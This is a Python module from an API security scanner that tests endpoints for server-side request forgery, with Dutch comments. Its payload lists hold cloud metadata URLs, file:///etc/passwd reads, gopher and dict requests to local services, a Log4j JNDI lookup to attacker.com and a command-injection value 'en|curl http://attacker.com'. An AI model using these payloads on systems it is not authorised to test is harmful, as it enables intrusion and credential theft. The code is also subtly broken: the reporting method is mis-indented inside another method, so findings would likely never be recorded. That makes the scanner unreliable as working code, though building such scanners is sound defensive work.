##################################
# APISCAN - API Security Scanner #
# Licensed under the MIT License #
# Author: Perry Mertens, 2025    #
##################################
from __future__ import annotations

import json
import random
import threading
import time
import socket
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import quote_plus, urljoin

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from report_utils import ReportGenerator  # door Perry samengevoegde helper
# Schakel waarschuwing uit voor self-signed TLS tijdens tests
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)  # type: ignore

Endpoint = Dict[str, Any]
Issue = Dict[str, Any]


class SSRFAuditor:
    """Voert uitsluitend **API-8 - Server-Side Request Forgery** detectie uit."""

    # --- configuratie --------------------------------------------------
    PAYLOADS = [
        # Cloud metadata services
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",  # AliCloud
        # Loopback varianten
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://2130706433/",  # 127.0.0.1 in int-vorm
        "http://127.0.0.1.nip.io/",
        # Bestands- en protocol-abuse
        "file:///etc/passwd",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "gopher://127.0.0.1:11211/_stats\r\nquit\r\n",
        # Out-of-band-/ OAST
        "http://burpcollaborator.net/",
        "http://127.0.0.1:80/",
        "http://localhost:22/",
        "http://169.254.169.254/",  # Zonder specifiek path
        "dict://127.0.0.1:6379/info",  # Redis
        "http://localtest.me/",  # Resolves to 127.0.0.1
        "http://customer.app.localhost.127.0.0.1.nip.io/",
    ]

    LANG_PAYLOADS = [
        "http://127.0.0.1/%0D%0AConnection:%20keep-alive",  # HTTP header injection
        "en;http://169.254.169.254",  # Parameter pollution
        "../../../../etc/passwd",     # Path traversal
        "${jndi:ldap://attacker.com}", # Log4j
        "en|curl http://attacker.com", # Command injection
    ]

    MAX_CONCURRENCY = 10
    DEFAULT_TIMEOUT = 8
    DEFAULT_RPS = 8
    BLIND_THRESHOLD = 4  # seconden

    # -------------------------------------------------------------------
    def __init__(
        self,
        base_url: str,
        session: Optional[requests.Session] = None,
        *,
        concurrency: int = MAX_CONCURRENCY,
        rps: int = DEFAULT_RPS,
        timeout: int = DEFAULT_TIMEOUT,
        verify_tls: bool = False,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.sess = session or requests.Session()
        self.sess.verify = verify_tls
        self.concurrency = concurrency
        self.rps = rps
        self.timeout = timeout

        self._last_ts = 0.0
        self._lock = threading.Lock()
        self._issues: List[Issue] = []

    # ------------------------------------------------------------------
    @staticmethod
    def endpoints_from_swagger(swagger_path: str | Path, *, default_base: str = "") -> List[Endpoint]:
        """Parse (Open)API spec and return a list of endpoint dicts **including a full `url` key**.

        apiscan.py expects each entry to have:
            {"method": "GET", "path": "/pets", "url": "https://api.example.com/pets", ...}
        """
        spec = json.loads(Path(swagger_path).read_text(encoding="utf-8"))
        server_decl = spec.get("servers", [{}])
        server = server_decl[0].get("url", "") if server_decl else ""
        base = server or default_base

        endpoints: List[Endpoint] = []
        for path, item in spec.get("paths", {}).items():
            for method in item.keys():
                full_url = urljoin(base, path.lstrip("/"))
                endpoints.append({
                    "method": method.upper(),
                    "path": path,
                    "base": base,
                    "url": full_url,
                })
        return endpoints

    # ------------------------------------------------------------------
    def test_endpoints(self, endpoints: List[Endpoint]) -> List[Issue]:
        """Scan alle endpoints en retourneer lijst met findings."""
        print(f"[+] Start SSRF scan op {len(endpoints)} endpoints...")
        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
            pool.map(self._scan_endpoint, endpoints)
        print("[+] SSRF scan afgerond.")
        return self._issues

    # ------------------------------------------------------------------
    # interne helpers
    def _scan_endpoint(self, ep: Endpoint) -> None:
        print(f"[*] SSRF scan: {ep['method']} {ep['path']}") 
        base = ep.get("base") or self.base_url
        url_base = urljoin(base, ep["path"].lstrip("/"))
        method = ep["method"]
        
        # Parameter detectie optimalisatie
        parameters = ep.get("parameters", [])
        param_names = {p["name"] for p in parameters if p["in"] in ["query", "header", "path"]}
        
        # Combineer met standaard parameters (zonder duplicates)
        COMMON_PARAMS = {"url", "endpoint", "host", "server", "target", 
                        "lang", "language", "locale", "v", "version", "api"}
        all_params = param_names.union(COMMON_PARAMS)
        
        # Specifieke payloads voor taal/version parameters
        LANG_PAYLOADS = [
            "http://127.0.0.1/%0D%0AConnection:%20keep-alive",
            "en;http://169.254.169.254",
            "../../../../etc/passwd",
            "${jndi:ldap://attacker.com}",
            "en|curl http://attacker.com",
        ]
        
        # Eén gecombineerde scanlus voor efficiëntie
        for param in all_params:
            # Standaard payloads voor alle parameters
            for payload in random.sample(self.PAYLOADS, len(self.PAYLOADS)):
                self._probe_params(ep, url_base, method, param, payload)
            
            # Extra payloads voor taal/version parameters
            if param in {"lang", "language", "locale", "v", "version"}:
                for payload in LANG_PAYLOADS:
                    self._probe_params(ep, url_base, method, param, payload)
   
    def _probe(
        self,
        ep: Endpoint,
        url: str,
        method: str,
        *,
        payload: str,
        param: str = None,
        json_body: Optional[dict] = None,
        data: Optional[dict] = None,
        headers: Optional[dict] = None,
    ) -> None:
        """
        Voert een SSRF test uit en detecteert reflecties en blinde SSRF vulnerabilities.
        
        Args:
            ep: Endpoint informatie
            url: Target URL
            method: HTTP methode
            payload: SSRF payload die geïnjecteerd wordt
            param: Parameter naam waarin geïnjecteerd wordt
            json_body: Optionele JSON body
            data: Optionele form data
            headers: Optionele headers
        """
        # Rate limiting
        with self._lock:
            gap = 1 / self.rps
            delta = time.time() - self._last_ts
            if delta < gap:
                time.sleep(gap - delta)
            self._last_ts = time.time()

        try:
            # Prepare request
            req_headers = headers or {}
            if not req_headers.get('User-Agent'):
                req_headers['User-Agent'] = 'SSRF-Auditor/1.0'
                
            start = time.time()
            resp = self.sess.request(
                method,
                url,
                json=json_body,
                data=data,
                headers=req_headers,
                timeout=self.timeout,
                allow_redirects=False,  # Redirects kunnen SSRF maskeren
                verify=False  # Voor testdoeleinden
            )
            latency = time.time() - start

            # Analyze response
            body = resp.text.lower()
            host = urlparse(payload).netloc.split(':')[0].lower()
            
            # Verbeterde reflectie detectie
            reflected = self._detect_reflection(body, payload, param, host)
            
            # Verbeterde blind SSRF detectie
            blind = (
                resp.status_code in {400, 502, 503, 504, 522, 524} or  # Uitgebreide error codes
                latency > self.BLIND_THRESHOLD or
                any(keyword in body for keyword in [
                    "error", 
                    "timeout", 
                    "refused",
                    "internal server error",
                    "bad gateway"
                ])
            )

            if reflected or blind:
                note = (
                    f"Reflected SSRF via parameter '{param}'" 
                    if param and reflected 
                    else "Reflected SSRF" if reflected 
                    else "Possible blind SSRF"
                )
                self._record_issue(
                    ep=ep,
                    payload=payload,
                    status=resp.status_code,
                    latency=latency,
                    note=note,
                    param=param,
                    request_headers=req_headers,
                    response_headers=dict(resp.headers),
                    response_body=resp.text[:1000]  # Bewaar eerste 1000 chars
                )

        except requests.RequestException as e:
            if any(err in str(e).lower() for err in ["refused", "timeout", "reset", "connection"]):
                self._record_issue(
                    ep=ep,
                    payload=payload,
                    status=0,
                    latency=0,
                    note=f"Possible blind SSRF (error: {str(e)[:100]})",
                    param=param
                )

    def _detect_reflection(self, body: str, payload: str, param: str = None, host: str = None) -> bool:
        """
        Detecteert of de payload of gerelateerde patronen gereflecteerd worden in de response.
        
        Args:
            body: Response body (lowercase)
            payload: Oorspronkelijke payload
            param: Parameter naam waarin geïnjecteerd is
            host: Host uit de payload
            
        Returns:
            bool: True als reflectie gedetecteerd wordt
        """
        payload_lc = payload.lower()
        
        # Directe payload reflectie
        if payload_lc in body:
            return True
            
        # Host reflectie (zonder protocol)
        if host and host in body:
            return True
            
        # Parameter-specifieke patronen
        if param:
            param_lc = param.lower()
            patterns = [
                f"{param_lc}=",               # Parameter in response
                f"invalid {param_lc}",         # Validatie errors
                f"unknown {param_lc}",
                f"unsupported {param_lc}",
                f"missing {param_lc}",
                f"{param_lc} invalid",
                f"{param_lc} required",
                f"{param_lc} must be",        # Validatie messages
                f"invalid value for {param_lc}"
            ]
            if any(p in body for p in patterns):
                return True
        
        # Generieke SSRF indicatoren
        ssrf_indicators = [
            "localhost",
            "127.0.0.1",
            "169.254.169.254",
            "metadata.google.internal",
            "internal server error",
            "forbidden",
            "not allowed"
        ]
        return any(indicator in body for indicator in ssrf_indicators)


    def _probe_params(self, ep: Endpoint, base_url: str, method: str, param: str, payload: str):
        """Test SSRF in verschillende parameter contexten"""
        
        # 1. Query parameters (/?param=payload)
        qs = f"{base_url}?{param}={quote_plus(payload)}"
        self._probe(ep, qs, method, payload=payload, param=param)
        
        # 2. JSON body (POST/PUT/PATCH)
        if method in {"POST", "PUT", "PATCH"}:
            self._probe(ep, base_url, method, 
                    json_body={param: payload},
                    payload=payload,
                    param=param)
        
        # 3. Form data
        if method in {"POST", "PUT", "PATCH"}:
            self._probe(ep, base_url, method,
                    data={param: payload},
                    payload=payload,
                    param=param)
        
        # 4. Headers
        headers = {param: payload}
        self._probe(ep, base_url, method,
                headers=headers,
                payload=payload,
                param=param)
        
        # 5. Path parameters (/users/{param}/profile)
        if "{" + param + "}" in base_url:
            path_url = base_url.replace("{" + param + "}", quote_plus(payload))
            self._probe(ep, path_url, method,
                    payload=payload,
                    param=param)

    
        def _record_issue(
            self, 
            ep: Endpoint, 
            payload: str, 
            status: int, 
            latency: float, 
            note: str, 
            param: str = None,
            request_headers: Optional[dict] = None,
            response_headers: Optional[dict] = None,
            response_body: Optional[str] = None
        ) -> None:
            issue = {
                "endpoint": f"{ep['method']} {ep['path']}",
                "parameter": param or "N/A",
                "payload": payload,
                "status_code": status,
                "latency": round(latency, 2),
                "description": note,
                "severity": "High" if "Reflected" in note else "Medium",
                "timestamp": datetime.utcnow().isoformat(),
                "request_headers": request_headers or {},
                "response_headers": response_headers or {},
                "response_body": response_body or "",
            }
            
            with self._lock:
                # Deduplicatie op endpoint + parameter + payload
                key = (issue["endpoint"], issue["parameter"], issue["payload"])
                if not any((i["endpoint"], i["parameter"], i["payload"]) == key 
                    for i in self._issues):
                    print(f"[!] SSRF finding: {issue['description']} on {issue['endpoint']} (param: {param})")
                    self._issues.append(issue)
        
        # ------------------------------------------------------------------
    # rapportage-helpers
    def _filtered_findings(self) -> List[Issue]:
        """Return current unique findings (dedupe al in _record_issue)."""
        return self._issues

    def generate_report(self, fmt: str = "html") -> str:
        issues = self._filtered_findings()
        if not issues:
            issues.append({
                "endpoint": "-",
                "method": "INFO",
                "description": "No SSRF findings detected",
                "severity": "Info",
                "status_code": 200,
                "timestamp": datetime.utcnow().isoformat(),
                "request_headers": {},
                "response_headers": {},
                "request_body": None,
                "response_body": "",
            })
        gen = ReportGenerator(issues, scanner="SSRF (API8)", base_url=self.base_url)
        return gen.generate_html() if fmt == "html" else gen.generate_markdown()

    def save_report(self, path: str, fmt: str = "html") -> None:
        Path(path).write_text(self.generate_report(fmt), encoding="utf-8")
